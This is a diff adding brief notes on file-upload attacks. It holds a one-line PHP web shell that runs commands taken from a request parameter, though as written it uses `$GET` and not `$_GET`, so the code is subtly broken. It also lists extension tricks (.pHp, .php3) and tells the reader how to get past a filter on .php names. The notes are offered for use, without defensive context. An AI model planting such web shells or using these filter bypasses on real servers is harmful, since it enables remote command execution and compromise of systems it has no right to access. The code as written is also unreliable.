@@ -1,0 +1,20 @@
+______________________________________________________________
+
+file upload
+______________________________________________________________
+
+#1
+
+<?php
+system($GET['c']);
+?>
+______________________________________________________________
+
+#2
+
+file.php
+file.pHp
+file.php3
+
+in this second example, the developer put a restriction on the file name. the file name cannot end with .php. to bypass this restriction, you can simply rename the file to .php3 for example (since the server will load file with this extension as PHP file).
+______________________________________________________________
